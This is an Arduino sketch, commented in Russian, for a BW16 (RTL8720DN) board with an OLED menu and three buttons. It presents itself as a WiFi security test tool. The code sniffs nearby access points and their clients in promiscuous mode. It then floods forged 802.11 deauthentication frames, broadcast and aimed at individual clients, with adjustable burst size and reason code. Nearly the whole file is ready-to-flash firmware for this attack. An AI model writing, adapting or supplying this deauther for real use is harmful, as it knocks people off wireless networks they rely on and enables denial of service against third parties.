/* ═══════════════════════════════════════════════════════════
   bw16_deauther.ino
   RTL8720DN / BW16 — WiFi security test tool
   UI:  SSD1306 128x64 (I2C) + 3 buttons (UP / DOWN / OK)
   Core: "AmebaD RTL8720DN (BW16)"
   ═══════════════════════════════════════════════════════════ */

#include <Wire.h>
#include <U8g2lib.h>
#include <WiFi.h>

extern "C" {
#include "wifi_conf.h"
}

/* ─────────────── ДИСПЛЕЙ ─────────────── */
#define DISPLAY_SSD1306 0
#define DISPLAY_ST7735  1
#ifndef DISPLAY_TYPE
#define DISPLAY_TYPE DISPLAY_SSD1306
#endif

#if DISPLAY_TYPE == DISPLAY_SSD1306
  U8G2_SSD1306_128X64_NONAME_F_HW_I2C disp(U8G2_R0, U8X8_PIN_NONE);
  static const int SCR_W = 128, SCR_H = 64;
#else
  U8G2_ST7735_160X128_F_4W_SW_SPI disp(U8G2_R0, PA_0, PA_1, PA_2, PA_3, U8X8_PIN_NONE);
  static const int SCR_W = 160, SCR_H = 128;
#endif

/* ─────────────── КНОПКИ ─────────────── */
#define PIN_BTN_UP    PA_12
#define PIN_BTN_DOWN  PA_13
#define PIN_BTN_OK    PA_14
#define BTN_ON        LOW

#define DEBOUNCE_MS   20
#define LONGPRESS_MS  700
#define REPEAT_DELAY  420
#define REPEAT_RATE   110

/* ─────────────── ЛИМИТЫ ─────────────── */
#define MAX_APS   48
#define MAX_CLI   24
#define HOP_MS    220

/* ─────────────── СТРУКТУРЫ ─────────────── */
struct AP {
  uint8_t  bssid[6];
  uint8_t  ch;
  uint16_t seen;
  char     ssid[33];
};

struct Client {
  uint8_t mac[6];
  uint8_t bssid[6];
  uint16_t seen;
};

/* ─────────────── СОСТОЯНИЕ ─────────────── */
static AP              aps[MAX_APS];
static volatile int    apCount = 0;

static Client          cls[MAX_CLI];
static volatile int    cliCount = 0;

static volatile int    curCh   = 1;
static volatile bool   attacking = false;
static volatile uint32_t txCount = 0;
static volatile uint32_t rxCount = 0;

static uint32_t lastHop  = 0;
static uint32_t lastBurst= 0;
static uint32_t ppsVal   = 0;
static uint32_t ppsLast  = 0;
static uint32_t ppsTx0   = 0;

/* настройки */
static int  burstSize    = 24;
static int  interBurstMs = 2;
static bool bcastMode    = true;
static uint8_t reasonCode = 7;

/* ─────────────── ЭКРАНЫ ─────────────── */
enum Screen : uint8_t {
  SCR_MAIN, SCR_SCAN, SCR_APLIST, SCR_ATTACK, SCR_SETTINGS, SCR_INFO
};
static Screen scr = SCR_MAIN;

static int menuSel  = 0;
static int apSel    = 0;
static int apScroll = 0;
static int setSel   = 0;
static int targetAp = -1;

/* ─────────────── КНОПКИ: ЧТЕНИЕ ─────────────── */
struct Btn { bool stable=false, rawLast=false; uint32_t tChange=0, tNext=0; };
static Btn bUp, bDn, bOk;
static bool     okLongFired = false;
static uint32_t okDownAt    = 0;

struct BtnEvents { bool up=false, down=false, okShort=false, okLong=false; };

static bool pollRepeat(Btn& b, uint8_t pin) {
  const bool raw = (digitalRead(pin) == BTN_ON);
  const uint32_t now = millis();
  bool fire = false;

  if (raw != b.rawLast) { b.rawLast = raw; b.tChange = now; }

  if (now - b.tChange >= DEBOUNCE_MS && raw != b.stable) {
    b.stable = raw;
    if (raw) { fire = true; b.tNext = now + REPEAT_DELAY; }
  }
  else if (b.stable && (int32_t)(now - b.tNext) >= 0) {
    fire = true;
    b.tNext = now + REPEAT_RATE;
  }
  return fire;
}

static BtnEvents readButtons() {
  BtnEvents e;
  const uint32_t now = millis();

  e.up   = pollRepeat(bUp, PIN_BTN_UP);
  e.down = pollRepeat(bDn, PIN_BTN_DOWN);

  const bool raw = (digitalRead(PIN_BTN_OK) == BTN_ON);
  if (raw != bOk.rawLast) { bOk.rawLast = raw; bOk.tChange = now; }

  if (now - bOk.tChange >= DEBOUNCE_MS && raw != bOk.stable) {
    bOk.stable = raw;
    if (raw) { okDownAt = now; okLongFired = false; }
    else if (!okLongFired && (now - okDownAt) < LONGPRESS_MS) {
      e.okShort = true;
    }
  }
  if (bOk.stable && !okLongFired && (now - okDownAt) >= LONGPRESS_MS) {
    okLongFired = true;
    e.okLong = true;
  }
  return e;
}

/* ─────────────── УТИЛИТЫ ─────────────── */
static void macStr(const uint8_t* m, char* out) {   // out >= 18
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static int findAp(const uint8_t* mac) {
  for (int i = 0; i < apCount; i++)
    if (!memcmp(aps[i].bssid, mac, 6)) return i;
  return -1;
}

static void addClient(const uint8_t* mac, const uint8_t* bssid) {
  for (int i = 0; i < cliCount; i++)
    if (!memcmp(cls[i].mac, mac, 6) && !memcmp(cls[i].bssid, bssid, 6)) {
      if (cls[i].seen < 60000) cls[i].seen++;
      return;
    }
  if (cliCount >= MAX_CLI) return;
  Client& c = cls[cliCount];
  memcpy(c.mac, mac, 6);
  memcpy(c.bssid, bssid, 6);
  c.seen = 1;
  cliCount = cliCount + 1;
}

/* ─────────────── RX ─────────────── */
static void onFrame(unsigned char* buf, unsigned int len, void* /*ud*/) {
  rxCount++;
  if (len < 24) return;

  const uint8_t fc      = buf[0];
  const uint8_t type    = fc & 0x0C;
  const uint8_t subtype = (fc & 0xF0) >> 4;

  /* beacon (0x08) / probe-response (0x05) */
  if (type == 0x00 && (subtype == 0x08 || subtype == 0x05) && len >= 38) {
    const uint8_t* bssid = buf + 16;
    const int idx = findAp(bssid);
    if (idx >= 0) {
      if (aps[idx].seen < 60000) aps[idx].seen++;
      return;
    }
    if (apCount >= MAX_APS) return;

    AP& a = aps[apCount];
    memcpy(a.bssid, bssid, 6);
    a.ch   = (uint8_t)curCh;
    a.seen = 1;
    a.ssid[0] = 0;

    unsigned off = 36;
    while (off + 2 <= len) {
      const uint8_t id = buf[off];
      const uint8_t l  = buf[off + 1];
      if ((unsigned)off + 2u + l > len) break;
      if (id == 0 && l <= 32) {
        memcpy(a.ssid, buf + off + 2, l);
        a.ssid[l] = 0;
        break;
      }
      off += 2u + l;
    }
    if (!a.ssid[0]) strcpy(a.ssid, "<hidden>");

    apCount = apCount + 1;
    return;
  }

  /* clients: ищем кадры, где фигурирует известный BSSID */
  const uint8_t* a1 = buf + 4;
  const uint8_t* a2 = buf + 10;
  const uint8_t* a3 = buf + 16;

  const uint8_t* cli  = nullptr;
  const uint8_t* bss  = nullptr;

  int bi = findAp(a1);
  if (bi >= 0) { bss = a1; cli = a2; }
  else {
    bi = findAp(a2);
    if (bi >= 0) { bss = a2; cli = a1; }
    else {
      bi = findAp(a3);
      if (bi >= 0) { bss = a3; cli = a2; }
    }
  }
  if (bi < 0 || !cli) return;
  if (cli[0] & 0x01) return;                        // multicast/broadcast
  if (!memcmp(cli, "\0\0\0\0\0\0", 6)) return;

  addClient(cli, bss);
}

/* ─────────────── TX ─────────────── */
static void buildDeauth(uint8_t* f, const uint8_t* da,
                        const uint8_t* sa, const uint8_t* bssid, uint8_t rsn) {
  memset(f, 0, 26);
  f[0] = 0xC0;                 // deauth, flags 0
  memcpy(f +  4, da,    6);
  memcpy(f + 10, sa,    6);
  memcpy(f + 16, bssid, 6);
  f[24] = rsn;
  f[25] = 0x00;
}

static void doBurst(int apIdx) {
  if (apIdx < 0 || apIdx >= apCount) return;

  const AP& a = aps[apIdx];
  if (curCh != a.ch) { curCh = a.ch; wifi_set_channel(curCh); }

  static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  uint8_t f[26];
  int cliRot = 0;

  /* индекс первого клиента этого AP в общем списке */
  int firstCli = -1;
  for (int i = 0; i < cliCount; i++)
    if (!memcmp(cls[i].bssid, a.bssid, 6)) { firstCli = i; break; }

  for (int n = 0; n < burstSize; n++) {
    if (bcastMode) {
      buildDeauth(f, BCAST, a.bssid, a.bssid, reasonCode);
      wext_send_mgnt((char*)f, 26, 0, NULL);
      txCount++;
    }
    if (firstCli >= 0) {
      /* адресный удар: AP->client и client->AP */
      int tries = 0, i = firstCli;
      while (tries < cliCount) {
        if (!memcmp(cls[i].bssid, a.bssid, 6)) {
          if (cliRot-- <= 0) break;
        }
        i = (i + 1) % cliCount;
        tries++;
      }
      if (i < cliCount && !memcmp(cls[i].bssid, a.bssid, 6)) {
        buildDeauth(f, cls[i].mac, a.bssid, a.bssid, 2);
        wext_send_mgnt((char*)f, 26, 0, NULL);
        buildDeauth(f, a.bssid, cls[i].mac, a.bssid, 7);
        wext_send_mgnt((char*)f, 26, 0, NULL);
        txCount += 2;
      }
      cliRot = (cliRot + 1) % 8;
    }
  }
}

/* ─────────────── РИСОВАНИЕ ─────────────── */
static void drawHeader(const char* title, const char* right) {
  disp.setFont(u8g2_font_6x10_tf);
  disp.drawStr(2, 9, title);
  if (right) {
    disp.setFont(u8g2_font_5x7_tf);
    disp.drawStr(SCR_W - disp.getStrWidth(right) - 2, 9, right);
  }
  disp.drawHLine(0, 12, SCR_W);
}

static void drawMain() {
  static const char* items[] = { "SCAN", "ACCESS POINTS", "DEAUTH", "SETTINGS", "INFO" };
  static const int N = 5;

  disp.setFont(u8g2_font_6x10_tf);
  for (int i = 0; i < N; i++) {
    const int y = 12 + i * 11;
    if (i == menuSel) {
      disp.drawBox(0, y - 9, SCR_W, 11);
      disp.setDrawColor(0);
    }
    disp.drawStr(6, y, items[i]);
    if (i == menuSel) {
      disp.setDrawColor(1);
      disp.drawStr(0, y, ">");
    }
  }
  /* нижняя полоска состояния */
  disp.setFont(u8g2_font_5x7_tf);
  char b[32];
  snprintf(b, sizeof b, "AP:%d  CH:%02d  TX:%lu",
           (int)apCount, (int)curCh, (unsigned long)txCount);
  disp.drawStr(2, 63, b);
}

static void drawScan() {
  char r[20];
  snprintf(r, sizeof r, "CH%02d", (int)curCh);
  drawHeader("SCANNING", r);

  disp.setFont(u8g2_font_10x20_tf);
  char big[8];
  snprintf(big, sizeof big, "%02d", (int)curCh);
  const int w = disp.getStrWidth(big);
  disp.drawStr((SCR_W - w) / 2, 38, big);

  disp.setFont(u8g2_font_6x10_tf);
  char l2[32];
  snprintf(l2, sizeof l2, "aps: %d   clients: %d", (int)apCount, (int)cliCount);
  disp.drawStr(2, 52, l2);
  disp.setFont(u8g2_font_5x7_tf);
  disp.drawStr(2, 63, "OK = stop / back");
}

static void drawApList() {
  const int ROWS = 4;
  char r[16];
  snprintf(r, sizeof r, "%d ap", (int)apCount);
  drawHeader("ACCESS POINTS", r);

  if (apCount == 0) {
    disp.setFont(u8g2_font_6x10_tf);
    disp.drawStr(4, 30, "nothing found");
    disp.setFont(u8g2_font_5x7_tf);
    disp.drawStr(4, 44, "run SCAN first");
    return;
  }

  if (apSel < apScroll) apScroll = apSel;
  if (apSel >= apScroll + ROWS) apScroll = apSel - ROWS + 1;

  disp.setFont(u8g2_font_5x7_tf);
  for (int i = 0; i < ROWS; i++) {
    const int idx = apScroll + i;
    if (idx >= apCount) break;
    const int y = 22 + i * 11;

    if (idx == apSel) {
      disp.drawBox(0, y - 8, SCR_W, 10);
      disp.setDrawColor(0);
    }
    char line[40];
    snprintf(line, sizeof line, "%-14.14s ch%02u", aps[idx].ssid, aps[idx].ch);
    disp.drawStr(2, y, line);
    if (idx == apSel) disp.setDrawColor(1);
  }

  disp.setFont(u8g2_font_5x7_tf);
  char b[24];
  snprintf(b, sizeof b, "%d/%d", apSel + 1, (int)apCount);
  disp.drawStr(2, 63, b);
}

static void drawAttack() {
  char r[16];
  snprintf(r, sizeof r, "ch%02u", aps[targetAp].ch);
  drawHeader("DEAUTH", r);

  disp.setFont(u8g2_font_6x10_tf);
  disp.drawStr(2, 24, aps[targetAp].ssid);

  char m[20];
  macStr(aps[targetAp].bssid, m);
  disp.setFont(u8g2_font_5x7_tf);
  disp.drawStr(2, 34, m);

  char s[32];
  snprintf(s, sizeof s, "tx %lu   %lu pps",
           (unsigned long)txCount, (unsigned long)ppsVal);
  disp.setFont(u8g2_font_6x10_tf);
  disp.drawStr(2, 47, s);

  int nc = 0;
  for (int i = 0; i < cliCount; i++)
    if (!memcmp(cls[i].bssid, aps[targetAp].bssid, 6)) nc++;
  snprintf(s, sizeof s, "clients %d   rsn %u", nc, reasonCode);
  disp.setFont(u8g2_font_5x7_tf);
  disp.drawStr(2, 57, s);

  disp.drawStr(2, 63, "OK = stop");
}

static void drawSettings() {
  static const char* names[] = { "BURST", "REASON", "MODE", "BACK" };
  drawHeader("SETTINGS", nullptr);

  for (int i = 0; i < 4; i++) {
    const int y = 24 + i * 11;
    if (i == setSel) {
      disp.drawBox(0, y - 8, SCR_W, 10);
      disp.setDrawColor(0);
    }
    disp.setFont(u8g2_font_6x10_tf);
    disp.drawStr(2, y, names[i]);

    char v[16] = "";
    if (i == 0)      snprintf(v, sizeof v, "%d", burstSize);
    else if (i == 1) snprintf(v, sizeof v, "%u", reasonCode);
    else if (i == 2) snprintf(v, sizeof v, "%s", bcastMode ? "BCAST" : "ADDR");

    disp.setFont(u8g2_font_5x7_tf);
    disp.drawStr(SCR_W - disp.getStrWidth(v) - 2, y, v);

    if (i == setSel) disp.setDrawColor(1);
  }
}

static void drawInfo() {
  drawHeader("INFO", nullptr);
  disp.setFont(u8g2_font_5x7_tf);

  char b[40];
  snprintf(b, sizeof b, "fw bw16-test v1.0");
  disp.drawStr(2, 24, b);
  snprintf(b, sizeof b, "up  %lu s", millis() / 1000UL);
  disp.drawStr(2, 34, b);
  snprintf(b, sizeof b, "aps %d   cli %d", (int)apCount, (int)cliCount);
  disp.drawStr(2, 44, b);
  snprintf(b, sizeof b, "rx %lu   tx %lu",
           (unsigned long)rxCount, (unsigned long)txCount);
  disp.drawStr(2, 54, b);
  snprintf(b, sizeof b, "ch %02d", (int)curCh);
  disp.drawStr(2, 62, b);
}

static void drawScreen() {
  static uint32_t lastDraw = 0;
  const uint32_t now = millis();
  if (now - lastDraw < 60) return;          // ~16 fps
  lastDraw = now;

  disp.clearBuffer();

  if (attacking && targetAp >= 0)      drawAttack();
  else {
    switch (scr) {
      case SCR_MAIN:     drawMain();     break;
      case SCR_SCAN:     drawScan();     break;
      case SCR_APLIST:   drawApList();   break;
      case SCR_ATTACK:   drawAttack();   break;
      case SCR_SETTINGS: drawSettings(); break;
      case SCR_INFO:     drawInfo();     break;
    }
  }
  disp.sendBuffer();
}

/* ─────────────── ЛОГИКА ─────────────── */
static void startScan() {
  memset(aps, 0, sizeof aps);
  memset(cls, 0, sizeof cls);
  apCount = 0;
  cliCount = 0;
  apSel = 0;
  apScroll = 0;
  targetAp = -1;
  scr = SCR_SCAN;
}

static void hopChannel() {
  if (attacking) return;
  if (scr != SCR_SCAN) return;
  curCh = (curCh % 13) + 1;
  wifi_set_channel(curCh);
}

static void updateLogic() {
  const uint32_t now = millis();

  if (now - lastHop > HOP_MS) { lastHop = now; hopChannel(); }

  if (attacking && targetAp >= 0) {
    if (now - lastBurst >= (uint32_t)interBurstMs) {
      lastBurst = now;
      doBurst(targetAp);
    }
  }

  if (now - ppsLast >= 1000) {
    ppsVal  = txCount - ppsTx0;
    ppsTx0  = txCount;
    ppsLast = now;
  }
}

static void openAttack() {
  if (apSel < 0 || apSel >= apCount) return;
  targetAp = apSel;
  attacking = true;
  txCount = 0;
  ppsTx0 = 0;
  scr = SCR_ATTACK;
}

static void handleEvents(const BtnEvents& e) {
  /* OK-dолгое = универсально «назад/стоп» */
  if (e.okLong) {
    if (attacking) { attacking = false; scr = SCR_APLIST; return; }
    if (scr != SCR_MAIN) { scr = SCR_MAIN; return; }
    return;
  }

  switch (scr) {

    case SCR_MAIN:
      if (e.up   && menuSel > 0) menuSel--;
      if (e.down && menuSel < 4) menuSel++;
      if (e.okShort) {
        if (menuSel == 0) startScan();
        else if (menuSel == 1) { scr = SCR_APLIST; apSel = 0; apScroll = 0; }
        else if (menuSel == 2) { if (apCount) { apSel = 0; apScroll = 0; openAttack(); } }
        else if (menuSel == 3) { scr = SCR_SETTINGS; setSel = 0; }
        else                   { scr = SCR_INFO; }
      }
      break;

    case SCR_SCAN:
      if (e.okShort) scr = SCR_MAIN;
      break;

    case SCR_APLIST:
      if (e.up   && apSel > 0) apSel--;
      if (e.down && apSel < apCount - 1) apSel++;
      if (e.okShort && apCount) openAttack();
      break;

    case SCR_ATTACK:
      if (e.okShort) { attacking = false; scr = SCR_APLIST; }
      break;

    case SCR_SETTINGS:
      if (e.up   && setSel > 0) setSel--;
      if (e.down && setSel < 3) setSel++;
      if (e.okShort) {
        if (setSel == 0) burstSize = (burstSize >= 64) ? 8 : burstSize + 8;
        if (setSel == 1) reasonCode = (reasonCode >= 9) ? 1 : reasonCode + 1;
        if (setSel == 2) bcastMode = !bcastMode;
        if (setSel == 3) scr = SCR_MAIN;
      }
      break;

    case SCR_INFO:
      if (e.okShort) scr = SCR_MAIN;
      break;
  }
}

/* ─────────────── SETUP / LOOP ─────────────── */
void setup() {
  Serial.begin(115200);
  delay(200);

  pinMode(PIN_BTN_UP,   INPUT_PULLUP);
  pinMode(PIN_BTN_DOWN, INPUT_PULLUP);
  pinMode(PIN_BTN_OK,   INPUT_PULLUP);

#if DISPLAY_TYPE == DISPLAY_SSD1306
  Wire.begin();
#endif
  disp.begin();
  disp.setFont(u8g2_font_6x10_tf);

  disp.clearBuffer();
  disp.drawStr(6, 24, "BW16 TEST TOOL");
  disp.setFont(u8g2_font_5x7_tf);
  disp.drawStr(6, 38, "initializing radio...");
  disp.sendBuffer();

  WiFi.mode(WIFI_STA);
  wifi_on(RTW_MODE_STA);
  wifi_disconnect();

  wifi_set_promiscuous_rx_cb(onFrame);
  wifi_set_promiscuous(1);
  wifi_set_channel(1);

  delay(400);
  Serial.println(F("[bw16] ready"));

  scr = SCR_MAIN;
}

void loop() {
  const BtnEvents e = readButtons();
  handleEvents(e);
  updateLogic();
  drawScreen();
  delay(2);
}
